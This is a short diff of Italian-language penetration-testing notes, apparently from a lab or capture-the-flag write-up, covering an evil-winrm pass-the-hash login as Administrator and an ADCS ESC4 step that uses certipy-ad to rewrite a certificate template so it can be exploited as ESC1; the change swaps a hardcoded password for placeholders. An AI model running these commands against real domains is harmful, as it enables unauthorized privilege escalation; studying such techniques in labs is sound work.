@@ -60,7 +60,7 @@ evil-winrm -i 10.10.11.202 -u Administrator -H <HASH>
 ### **ESC 4 - ADCS**
 Grazie al permesso genericWrite possiamo modificare il nostro template per renderlo vulnerabile all'ESC1
 ```bash
-certipy-ad template -u <USER>@<DOMAIN -p 'horse' -template ESC4 -save-old -debug
+certipy-ad template -u <USER>@<DOMAIN> -p '<PASS>' -template <NOME TEMPLATE> -save-old -debug
 ```
 ![[Pasted image 20230828151521.png]]
 Poi exploitalo come ESC1.
